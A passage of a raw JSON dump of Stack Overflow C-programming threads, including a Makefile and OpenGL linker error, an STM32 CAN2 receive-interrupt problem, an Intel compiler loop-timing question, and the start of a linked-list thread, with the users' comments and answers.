still not working.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint main(){\n    system(\"vlc 1.mp3\");\n    system(\"q\");\n    system(\"vlc 2.mp3\");\n    system(\"q\");\n    system(\"vlc 3.mp3\");\n    system(\"q\");    \n    return 0;\n} \n</code></pre>\n"}, {"tags": ["c", "linux", "ubuntu", "opengl", "makefile"], "answers": [{"comments": [{"owner": {"reputation": 327, "user_id": 4924035, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/BXdAs.jpg?s=128&g=1", "display_name": "privetDruzia", "link": "https://stackoverflow.com/users/4924035/privetdruzia"}, "edited": false, "score": 0, "creation_date": 1459348713, "post_id": 36311999, "comment_id": 60247535, "body": "so what do you suggest? Should I just remove the backslash? Because strangely that worked previously fine for previous pieces of code.."}, {"owner": {"reputation": 149158, "user_id": 524368, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/oZ8Up.png?s=128&g=1", "display_name": "datenwolf", "link": "https://stackoverflow.com/users/524368/datenwolf"}, "reply_to_user": {"reputation": 327, "user_id": 4924035, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/BXdAs.jpg?s=128&g=1", "display_name": "privetDruzia", "link": "https://stackoverflow.com/users/4924035/privetdruzia"}, "edited": false, "score": 0, "creation_date": 1459361247, "post_id": 36311999, "comment_id": 60256151, "body": "@privetDruzia: First things first I suggest you learn how Makefiles work and the makefile syntax. And I recommend removing the line `LDOPTS=` because it makes zero sense."}, {"owner": {"reputation": 327, "user_id": 4924035, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/BXdAs.jpg?s=128&g=1", "display_name": "privetDruzia", "link": "https://stackoverflow.com/users/4924035/privetdruzia"}, "edited": false, "score": 0, "creation_date": 1459364097, "post_id": 36311999, "comment_id": 60258062, "body": "ok thanks for your critics... I removed LDOPTS, didn&#39;t solve anything. So I have a problem and your answer to my problem &quot;just go and learn&quot; and you didn&#39;t solve my issue, very usefull..."}, {"owner": {"reputation": 149158, "user_id": 524368, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/oZ8Up.png?s=128&g=1", "display_name": "datenwolf", "link": "https://stackoverflow.com/users/524368/datenwolf"}, "reply_to_user": {"reputation": 327, "user_id": 4924035, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/BXdAs.jpg?s=128&g=1", "display_name": "privetDruzia", "link": "https://stackoverflow.com/users/4924035/privetdruzia"}, "edited": false, "score": 0, "creation_date": 1459366074, "post_id": 36311999, "comment_id": 60259330, "body": "@privetDruzia: I don&#39;t want to be rude, but the problem I see is, that you simply copy&#39;n&#39;pasted your Makefile from various sources, without actually comprehending what&#39;s going on. The same goes for your linker problem. In fact your specific question has been asked countless times on StackOverflow, your particular flavour just adds Makefiles into the mix. For example your Makefile has the CFLAGS variable expansion in the wrong place (it belongs into the compilation phase, not the linking phase). The order of libraries as passed to the linker matters."}, {"owner": {"reputation": 327, "user_id": 4924035, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/BXdAs.jpg?s=128&g=1", "display_name": "privetDruzia", "link": "https://stackoverflow.com/users/4924035/privetdruzia"}, "edited": false, "score": 0, "creation_date": 1459366612, "post_id": 36311999, "comment_id": 60259706, "body": "@It is a makefile (for a previous exercise in 2D) provided by our teacher. He teaches me so excuse me for not seeing the error my teacher makes..."}, {"owner": {"reputation": 149158, "user_id": 524368, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/oZ8Up.png?s=128&g=1", "display_name": "datenwolf", "link": "https://stackoverflow.com/users/524368/datenwolf"}, "reply_to_user": {"reputation": 327, "user_id": 4924035, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/BXdAs.jpg?s=128&g=1", "display_name": "privetDruzia", "link": "https://stackoverflow.com/users/4924035/privetdruzia"}, "edited": false, "score": 1, "creation_date": 1459368502, "post_id": 36311999, "comment_id": 60260778, "body": "@privetDruzia: See my answer update. I added a fixed Makefile that will get the job done (assuming that your source file is name <code>vlucht.c</code>) you may rename to your desire."}, {"owner": {"reputation": 327, "user_id": 4924035, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/BXdAs.jpg?s=128&g=1", "display_name": "privetDruzia", "link": "https://stackoverflow.com/users/4924035/privetdruzia"}, "edited": false, "score": 0, "creation_date": 1459368702, "post_id": 36311999, "comment_id": 60260882, "body": "This solved the issue thank you! Here you go, just accepted and upvoted your answer"}, {"owner": {"reputation": 149158, "user_id": 524368, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/oZ8Up.png?s=128&g=1", "display_name": "datenwolf", "link": "https://stackoverflow.com/users/524368/datenwolf"}, "reply_to_user": {"reputation": 327, "user_id": 4924035, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/BXdAs.jpg?s=128&g=1", "display_name": "privetDruzia", "link": "https://stackoverflow.com/users/4924035/privetdruzia"}, "edited": false, "score": 0, "creation_date": 1459369013, "post_id": 36311999, "comment_id": 60261053, "body": "@privetDruzia: Still you should try to understand what&#39;s actually happening there. This is a starting point to understand implicit rules: <a href=\"https://www.gnu.org/software/make/manual/html_node/Catalogue-of-Rules.html#Catalogue-of-Rules\" rel=\"nofollow noreferrer\">gnu.org/software/make/manual/html_node/&hellip;</a>"}], "tags": [], "owner": {"reputation": 149158, "user_id": 524368, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/oZ8Up.png?s=128&g=1", "display_name": "datenwolf", "link": "https://stackoverflow.com/users/524368/datenwolf"}, "is_accepted": true, "score": 3, "last_activity_date": 1459368445, "last_edit_date": 1459368445, "creation_date": 1459348395, "answer_id": 36311999, "question_id": 36311380, "link": "https://stackoverflow.com/questions/36311380/error-makefile-c-opengl/36311999#36311999", "title": "error makefile C- opengl", "body": "<p>Your problem lies here: </p>\n\n<pre><code>my3DTest: clean $(OBJS)\n    LDOPTS=\\\n    cc -o my3DTest $(CFLAGS) $(OBJS) $(LIBPATH) $(LIBS)\n</code></pre>\n\n<p>the variable LDOPTS assignment is continued into the next line, due to the backslash (<code>\\</code>), thereby your <code>cc</code> command is just assigned to that variable. Once that's done <em>make</em> continues by using its standard implicit target rules to build the binary. But since you didn't specify the linker options in a variable that <em>make</em> will use for that implicit rule, it will try to link without these variables.</p>\n\n<hr>\n\n<p>Makefile, assuming that the sourcefile is names <code>vlucht.c</code>.</p>\n\n<p><strong>Important Notice:</strong> <em>Indentation and whitespace does matter in a Makefile. Improper indentation will corrupt the Makefile!</em></p>\n\n<pre><code>LDLIBS = -lglut -lGLU -lGL -lXt -lXext -lm\nEXE  = vlucht\nOBJS = vlucht.o\n\n.PHONY: clean\n\nall: $(EXE)\n\n$(EXE): $(OBJS)\n\nclean:\n    -$(RM) -f $(EXE) $(OBJS)\n</code></pre>\n"}], "owner": {"reputation": 327, "user_id": 4924035, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/BXdAs.jpg?s=128&g=1", "display_name": "privetDruzia", "link": "https://stackoverflow.com/users/4924035/privetdruzia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 310, "favorite_count": 0, "accepted_answer_id": 36311999, "answer_count": 1, "score": 0, "last_activity_date": 1459434307, "creation_date": 1459347004, "last_edit_date": 1459434307, "question_id": 36311380, "link": "https://stackoverflow.com/questions/36311380/error-makefile-c-opengl", "title": "error makefile C- opengl", "body": "<p>I am trying to compile a .c file containing c-code for opengl.\nBut I keep getting the following error:\nInteresting question. \n    undefined reference to 'glClear'\n    undefined reference to 'gluLookAt'\n    undefined reference to 'glLoadIdentity'\n    undefined reference to 'glColor3f'\n    undefined reference to 'glLineWidth'\n    undefined reference to 'glBegin'\n    undefined reference to 'glVertex3d'\n    undefined reference to 'glEnd'\n    etc...</p>\n\n<p>I am pretty sure there is nothing wrong with my source code as it is example code that has been provided to us.</p>\n\n<p>the headers i included:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#include &lt;GL/glut.h&gt;\n</code></pre>\n\n<p>How could I fix this issue? </p>\n\n<p>FYI: I am compiling this on ubuntu</p>\n"}, {"tags": ["c", "interrupt", "stm32", "can-bus"], "answers": [{"comments": [{"owner": {"reputation": 158, "user_id": 3761494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dfcff17d7d14d585c927f1dbd693f33b?s=128&d=identicon&r=PG&f=1", "display_name": "JeLLyB0x3r", "link": "https://stackoverflow.com/users/3761494/jellyb0x3r"}, "edited": false, "score": 0, "creation_date": 1476479084, "post_id": 38747806, "comment_id": 67380072, "body": "Docs say that BankNumber should be between 0 and 28, to enable all can filters for CAN2, not CAN1, the value should be 0. I think 0x2d only somehow works because of overflow, because that evaluates to 45, well past the suggest values in the docs."}], "tags": [], "owner": {"reputation": 61, "user_id": 6247472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/513c42dde3f3c0c1b6f9f66d97e045fb?s=128&d=identicon&r=PG&f=1", "display_name": "Marcin Gajewski", "link": "https://stackoverflow.com/users/6247472/marcin-gajewski"}, "is_accepted": false, "score": 3, "last_activity_date": 1470238038, "creation_date": 1470238038, "answer_id": 38747806, "question_id": 36311263, "link": "https://stackoverflow.com/questions/36311263/stm32f1xx-can2-receive-interrupt-not-being-called/38747806#38747806", "title": "STM32F1xx CAN2 receive interrupt not being called", "body": "<p>I had similar issue and what help was reference manual:</p>\n\n<p>CAN2SB[5:0]: CAN2 start bank</p>\n\n<p>These bits are set and cleared by software. They define the start bank for the CAN2\ninterface (Slave) in the range 0 to 27.</p>\n\n<p><strong>Note: When CAN2SB[5:0] = 28d, all the filters to CAN1 can be used.</strong></p>\n\n<p>When CAN2SB[5:0] is set to 0, no filters are assigned to CAN1\nsFilterConfig.BankNumber = 20;</p>\n\n<p>Please change\n  <code>sFilterConfig.BankNumber = 20;</code></p>\n\n<p>to</p>\n\n<p><code>sFilterConfig.BankNumber = 0x2d;</code></p>\n"}, {"tags": [], "owner": {"reputation": 45, "user_id": 2196442, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/636145f83a46eb407574f81170d84477?s=128&d=identicon&r=PG", "display_name": "FoxVK", "link": "https://stackoverflow.com/users/2196442/foxvk"}, "is_accepted": false, "score": 0, "last_activity_date": 1511894330, "creation_date": 1511894330, "answer_id": 47538675, "question_id": 36311263, "link": "https://stackoverflow.com/questions/36311263/stm32f1xx-can2-receive-interrupt-not-being-called/47538675#47538675", "title": "STM32F1xx CAN2 receive interrupt not being called", "body": "<p>You must perform settings of all filters through hcan1. Even for Can2.</p>\n\n<blockquote>\n  <p>In connectivity line\n  devices, the registers from offset 0x200 to 31C are present only in CAN1.</p>\n</blockquote>\n\n<p>...and on offset 0x200 begins filter settings... </p>\n"}], "owner": {"reputation": 705, "user_id": 1420189, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5d12081b840bec99138c8812d9b5cde5?s=128&d=identicon&r=PG", "display_name": "Arman", "link": "https://stackoverflow.com/users/1420189/arman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5690, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1511894330, "creation_date": 1459346751, "question_id": 36311263, "link": "https://stackoverflow.com/questions/36311263/stm32f1xx-can2-receive-interrupt-not-being-called", "title": "STM32F1xx CAN2 receive interrupt not being called", "body": "<p>I've successfully established CAN communication with CAN1 of two STM32F105vC(s)(Which has two CANs), and I can send and receive CAN frames.</p>\n\n<p>But when I change my code to use CAN2, it works, I mean it acknowledges the received CAN frames but the <strong>receive interrupt is not being called at all</strong>.</p>\n\n<p>I thought it's filter configuration, I changed the BankNumber multipletimes (tried 0, 1, 14, 20), no luck.</p>\n\n<p>Here is my configurations:</p>\n\n<p>Initilizing:</p>\n\n<pre><code>init_HAL_CAN(CAN2);\n\nif(HAL_CAN_Receive_IT(canHandle, CAN_FIFO0) != HAL_OK)\n{\n    /* Reception Error */\n    Error_Handler();\n}\n</code></pre>\n\n<p>Receive callback:</p>\n\n<pre><code>void HAL_CAN_RxCpltCallback(CAN_HandleTypeDef* CanHandle)\n{\n    LED_DBG_TOGGLE();\n\n    // other \n    // stuff \n    // here\n    //...\n\n    /* Receive */\n    if(HAL_CAN_Receive_IT(CanHandle, CAN_FIFO0) != HAL_OK)\n    {\n        /* Reception Error */\n        Error_Handler();\n    }\n}\n</code></pre>\n\n<p>Init function:</p>\n\n<pre><code>void init_HAL_CAN(CAN_TypeDef* _CANInstance)\n{\n    CAN_FilterConfTypeDef sFilterConfig;\n    static CanTxMsgTypeDef TxMessage;\n    static CanRxMsgTypeDef RxMessage;\n\n    /*##-1- Configure the CAN peripheral #######################################*/\n    canHandle-&gt;Instance = _CANInstance;\n    canHandle-&gt;pTxMsg = &amp;TxMessage;\n    canHandle-&gt;pRxMsg = &amp;RxMessage;\n    canHandle-&gt;Init.TTCM = DISABLE; //Non time trigger communication mode //\n    canHandle-&gt;Init.ABOM = DISABLE;  //The software automatically Bus-off management     //\n    canHandle-&gt;Init.AWUM = DISABLE; //Sleep mode wake by software (clear CAN-&gt; MCR SLEEP) (automatic wake-up mode)//\n    canHandle-&gt;Init.NART = DISABLE;  //Disable automatic transfer message (non-automatic retransmission mode)//\n    canHandle-&gt;Init.RFLM = DISABLE; //The message is not locked, the new cover the old // \n    canHandle-&gt;Init.TXFP = DISABLE; // Priority is determined by the message identifier //\n\n    canHandle-&gt;Init.Mode = CAN_MODE_NORMAL;\n    canHandle-&gt;Init.SJW = CAN_SJW_1TQ;\n    canHandle-&gt;Init.BS1 = CAN_BS1_2TQ;\n    canHandle-&gt;Init.BS2 = CAN_BS2_1TQ;\n    canHandle-&gt;Init.Prescaler = 7;\n\n    if(HAL_CAN_Init(canHandle) != HAL_OK)\n    {\n        /* Initialization Error */\n        Error_Handler();\n        return false;\n    }\n\n    /*##-2- Configure the CAN Filter ###########################################*/\n    CAN_FilterConfTypeDef sFilterConfig;\n    sFilterConfig.FilterNumber = 0;\n    sFilterConfig.FilterMode = CAN_FILTERMODE_IDMASK;\n    sFilterConfig.FilterScale = CAN_FILTERSCALE_32BIT;\n    sFilterConfig.FilterIdHigh = 0x0000;\n    sFilterConfig.FilterIdLow = 0x0000;\n    sFilterConfig.FilterMaskIdHigh = 0x0000;\n    sFilterConfig.FilterMaskIdLow = 0x0000;\n    sFilterConfig.FilterFIFOAssignment = 0;\n    sFilterConfig.FilterActivation = ENABLE;\n    sFilterConfig.BankNumber = 20;\n\n    if (HAL_CAN_ConfigFilter(canHandle, &amp;sFilterConfig) != HAL_OK)\n    {\n        /* Filter configuration Error */\n        Error_Handler();\n        return false;\n    }\n\n}\n</code></pre>\n\n<p>IRQHandler (placed in stm32f1xx_it.c):</p>\n\n<pre><code>void CAN2_RX0_IRQHandler(void)\n{\n    HAL_CAN_IRQHandler(canHandle);\n}\n</code></pre>\n\n<p>MspInit function (placed in stm32f1xx_hal_msp.c) :</p>\n\n<pre><code>void HAL_CAN_MspInit(CAN_HandleTypeDef *hcan)\n{\n    GPIO_InitTypeDef   GPIO_InitStruct;\n\n    /*##-1- Enable peripherals and GPIO Clocks #################################*/\n    /* CAN1 Periph clock enable */\n    CANx1_CLK_ENABLE(); // Need to enable CAN1 clock too.\n    CANx2_CLK_ENABLE();\n    /* Enable GPIO clock ****************************************/\n    CANx2_GPIO_CLK_ENABLE();\n    /* CAN2 needs no remapping *******/\n\n    /*##-2- Configure peripheral GPIO ##########################################*/\n    /* CAN1 TX GPIO pin configuration */\n    GPIO_InitStruct.Pin = CANx2_TX_PIN;\n    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;\n    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_HIGH;\n    GPIO_InitStruct.Pull = GPIO_PULLUP;\n\n    HAL_GPIO_Init(CANx2_TX_GPIO_PORT, &amp;GPIO_InitStruct);\n\n    /* CAN1 RX GPIO pin configuration */\n    GPIO_InitStruct.Pin = CANx2_RX_PIN;\n    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;\n    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_HIGH;\n    GPIO_InitStruct.Pull = GPIO_PULLUP;\n\n    HAL_GPIO_Init(CANx2_RX_GPIO_PORT, &amp;GPIO_InitStruct);\n\n    /*##-3- Configure the NVIC #################################################*/\n    /* NVIC configuration for CAN2 Reception complete interrupt */\n\n    HAL_NVIC_SetPriority(CAN2_RX0_IRQn, 1, 0);\n    HAL_NVIC_EnableIRQ(CAN2_RX0_IRQn);\n\n}\n</code></pre>\n\n<p>I should mention again, that following codes works perfectly with <strong>CAN1</strong> (of course with changing CAN2 to CAN1, etc).</p>\n\n<p>And it's clear that the CAN controller is working because the other board that is transmitting CAN frames, <strong>receives the acknowledges</strong> (and does not get any transmitting error or timeout), the only problem here is <strong>Receive Interrupts</strong>, why?</p>\n"}, {"tags": ["c", "performance", "execution-time", "icc"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1459346252, "post_id": 36310999, "comment_id": 60245334, "body": "Not related: Don&#39;t cast the result of <code>malloc</code> &amp; friends in C!"}, {"owner": {"reputation": 8362, "user_id": 2993960, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/svN5z.jpg?s=128&g=1", "display_name": "Fiddling Bits", "link": "https://stackoverflow.com/users/2993960/fiddling-bits"}, "edited": false, "score": 0, "creation_date": 1459346603, "post_id": 36310999, "comment_id": 60245653, "body": "Maybe make the <code>double</code>s <code>volatile</code>?"}, {"owner": {"reputation": 21326, "user_id": 1679849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lpvxY.png?s=128&g=1", "display_name": "r3mainer", "link": "https://stackoverflow.com/users/1679849/r3mainer"}, "edited": false, "score": 2, "creation_date": 1459347171, "post_id": 36310999, "comment_id": 60246136, "body": "Have you tried <code>-O3</code> instead of <code>-O2</code>?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1459347500, "post_id": 36310999, "comment_id": 60246445, "body": "Look at disassembly  to find out. This code can be optimized pretty much even manually."}, {"owner": {"reputation": 33, "user_id": 6135038, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-JvK65KjwJHc/AAAAAAAAAAI/AAAAAAAAFw0/YjvBX0_BSnQ/photo.jpg?sz=128", "display_name": "Einar N&#230;ss Jensen", "link": "https://stackoverflow.com/users/6135038/einar-n%c3%a6ss-jensen"}, "edited": false, "score": 0, "creation_date": 1459347532, "post_id": 36310999, "comment_id": 60246474, "body": "Have tried with -O3 -parallell"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1459347680, "post_id": 36310999, "comment_id": 60246606, "body": "Look at the assembly output. Show it to us."}], "answers": [{"comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 3, "creation_date": 1459347716, "post_id": 36311666, "comment_id": 60246636, "body": "Not speaking of a fact <code>A</code> and <code>B</code> are constants for all <code>[i]</code>... the loops can go away completely."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1459347809, "post_id": 36311666, "comment_id": 60246715, "body": "@EugeneSh. Yeah this is a simplified example. There will be even more optimizations in the real program, especially at <code>-O3</code>."}, {"owner": {"reputation": 33, "user_id": 6135038, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-JvK65KjwJHc/AAAAAAAAAAI/AAAAAAAAFw0/YjvBX0_BSnQ/photo.jpg?sz=128", "display_name": "Einar N&#230;ss Jensen", "link": "https://stackoverflow.com/users/6135038/einar-n%c3%a6ss-jensen"}, "edited": false, "score": 0, "creation_date": 1459348017, "post_id": 36311666, "comment_id": 60246920, "body": "Yes. this must be it. adding volatile makes it run the same, compiled with all compilers"}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 5, "last_activity_date": 1459347632, "creation_date": 1459347632, "answer_id": 36311666, "question_id": 36310999, "link": "https://stackoverflow.com/questions/36310999/intel-compilator-for-loop-speed-c/36311666#36311666", "title": "Intel compilator for loop speed c", "body": "<p>Likely, one of the compilers aggressively optimizes away the whole burdensome nested loop. It seems likely that your optimized code actually ends up as:</p>\n\n<pre><code>t1=clock();\nt2=clock();\ndouble sum=0.0;\nfor (i=0;i&lt;n;i++) sum += A[i]*B[i];\n</code></pre>\n\n<p>It is perfectly fine for the compiler to do such optimizations. You can block optimizations by making the loop iterators <code>volatile</code>.</p>\n\n<p>Ensure that you have same level of optimization enabled on both compilers.</p>\n"}, {"tags": [], "owner": {"reputation": 8600, "user_id": 450758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e2ccb382a98f56c846d0e064f44920dc?s=128&d=identicon&r=PG", "display_name": "marko", "link": "https://stackoverflow.com/users/450758/marko"}, "is_accepted": false, "score": 2, "last_activity_date": 1459348857, "last_edit_date": 1459348857, "creation_date": 1459348551, "answer_id": 36312073, "question_id": 36310999, "link": "https://stackoverflow.com/questions/36310999/intel-compilator-for-loop-speed-c/36312073#36312073", "title": "Intel compilator for loop speed c", "body": "<p>The two nested loop are vectorisable providing the compiler is sure that the three areas of memory pointed to by <code>A</code>, <code>B</code>, and <code>C</code> do not alias.  Specifically, that values stored into through <code>C</code> can never be read again through <code>A</code> and <code>B</code> - which would be a hazard if the iterations of the loop ran in parallel, with a load and store order other than that implies in the code.</p>\n\n<p>In the general case, the compiler will not be able to infer this from pointers  returned from a function call, although it may legitimate for it to know about more about the semantics of standard library functions such as <code>malloc()</code> than the function signature alone would infer. </p>\n\n<p>It is possible the differences you see are due to change in the strictness of the aliasing rules between compiler versions - or possibly from different default option switches. </p>\n\n<p>Adding the <code>restrict</code> qualifier to the pointer declarations tells the compiler that it can assume the that aliasing cannot occur through the use of the pointer, and that the onus lies on the programmer to guarantee this.</p>\n\n<pre><code>double * restrict A = malloc (sizeof(double)*n);\ndouble * restrict B = malloc (sizeof(double)*n);\ndouble * restrict C = malloc (sizeof(double)*n);\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 6135038, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-JvK65KjwJHc/AAAAAAAAAAI/AAAAAAAAFw0/YjvBX0_BSnQ/photo.jpg?sz=128", "display_name": "Einar N&#230;ss Jensen", "link": "https://stackoverflow.com/users/6135038/einar-n%c3%a6ss-jensen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 0, "accepted_answer_id": 36311666, "answer_count": 2, "score": 3, "last_activity_date": 1459348857, "creation_date": 1459346161, "last_edit_date": 1459348143, "question_id": 36310999, "link": "https://stackoverflow.com/questions/36310999/intel-compilator-for-loop-speed-c", "title": "Intel compilator for loop speed c", "body": "<p>I'm struggling to understand why this code runs with blistering speed with Intel compiler 12, and really slows down with Intel compiler 16</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\nint main(int argc, char *argv[])\n{\n    int i,t;\n    int n=10000000;\n    int T=1000;\n    time_t t1,t2;\n\n    // double A[n],B[n],C[n];\n    double *A = (double*) malloc (sizeof(double)*n);\n    double *B = (double*) malloc (sizeof(double)*n);\n    double *C = (double*) malloc (sizeof(double)*n);\n\n\n\n    for (i=0;i&lt;n;i++)\n    {\n       A[i]=1.0;\n       B[i]=2.0;\n    }\n    t1=clock();\n\n    for (t=0;t&lt;T;t++)\n       for (i=0;i&lt;n;i++)\n          C[i]=A[i]*B[i];\n\n    t2=clock();\n    double sum=0.0;\n    for (i=0;i&lt;n;i++) sum += C[i];\n    printf(\"sum %f\\n\",sum);\n    printf(\"time %f\\n\",(double)(t2-t1)/CLOCKS_PER_SEC);\n}\n</code></pre>\n\n<hr>\n\n<ul>\n<li>Intel compiler 12: Takes 0.1 second to run on sandy bridge; Intel\ncompiler 16: Takes 25 seconds to run on sandy bridge</li>\n</ul>\n\n<p>makefile:\n    icc -O2 -o array array.c</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 906, "user_id": 5017179, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/DfIeu.jpg?s=128&g=1", "display_name": "ReshaD", "link": "https://stackoverflow.com/users/5017179/reshad"}, "edited": false, "score": 3, "creation_date": 1459346765, "post_id": 36310991, "comment_id": 60245792, "body": "could you please include LISTA definition? I mean how is defined"}, {"owner": {"reputation": 3333, "user_id": 1129667, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4a56d7975ff6832cee73c7c7d862512b?s=128&d=identicon&r=PG", "display_name": "Maurizio Benedetti", "link": "https://stackoverflow.com/users/1129667/maurizio-benedetti"}, "edited": false, "score": 2, "creation_date": 1459346894, "post_id": 36310991, "comment_id": 60245905, "body": "Without the definition of LISTA is pretty much impossible to be said. I suppose info is an int (l-&gt;info). and example of the output would help as well."}, {"owner": {"reputation": 1964, "user_id": 1320881, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b69670b7cc6bce132f443eee557c9448?s=128&d=identicon&r=PG", "display_name": "Unimportant", "link": "https://stackoverflow.com/users/1320881/unimportant"}, "edited": false, "score": 2, "creation_date": 1459349019, "post_id": 36310991, "comment_id": 60247779, "body": "Unrelated but the while loop will never handle the last item in the list. The loop will end when <code>l-&gt;urm == NULL</code>, meaning the current item is the last one in the list."}, {"owner": {"reputation": 11698, "user_id": 5399734, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/2162d669508364bb0c03aba1a2473aa8?s=128&d=identicon&r=PG&f=1", "display_name": "nalzok", "link": "https://stackoverflow.com/users/5399734/nalzok"}, "edited": false, "score": 0, "creation_date": 1459351668, "post_id": 36310991, "comment_id": 60249803, "body": "Could show us the example output text file?"}, {"owner": {"reputation": 5, "user_id": 6135066, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-X0EAq6lvVd4/AAAAAAAAAAI/AAAAAAAAADE/PUJf0tw8iJM/photo.jpg?sz=128", "display_name": "Catalin Zambalic", "link": "https://stackoverflow.com/users/6135066/catalin-zambalic"}, "edited": false, "score": 0, "creation_date": 1459351835, "post_id": 36310991, "comment_id": 60249954, "body": "<a href=\"http://uploadimage.ro/2FMd/Program_2.jpg\" rel=\"nofollow noreferrer\">uploadimage.ro/2FMd/Program_2.jpg</a>"}, {"owner": {"reputation": 1964, "user_id": 1320881, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b69670b7cc6bce132f443eee557c9448?s=128&d=identicon&r=PG", "display_name": "Unimportant", "link": "https://stackoverflow.com/users/1320881/unimportant"}, "edited": false, "score": 0, "creation_date": 1459353992, "post_id": 36310991, "comment_id": 60251601, "body": "Are you sure <code>urm</code> is <code>NULL</code> for the last item in the list? Looks like the while loop just keeps on going beyond the end of the list."}, {"owner": {"reputation": 5, "user_id": 6135066, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-X0EAq6lvVd4/AAAAAAAAAAI/AAAAAAAAADE/PUJf0tw8iJM/photo.jpg?sz=128", "display_name": "Catalin Zambalic", "link": "https://stackoverflow.com/users/6135066/catalin-zambalic"}, "edited": false, "score": 0, "creation_date": 1459355648, "post_id": 36310991, "comment_id": 60252659, "body": "Yeah, looks like the while loop is not stopping, but the code I think is good. I updated the question with the suplimentary information."}], "answers": [{"comments": [{"owner": {"reputation": 5, "user_id": 6135066, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-X0EAq6lvVd4/AAAAAAAAAAI/AAAAAAAAADE/PUJf0tw8iJM/photo.jpg?sz=128", "display_name": "Catalin Zambalic", "link": "https://stackoverflow.com/users/6135066/catalin-zambalic"}, "edited": false, "score": 0, "creation_date": 1459358918, "post_id": 36315227, 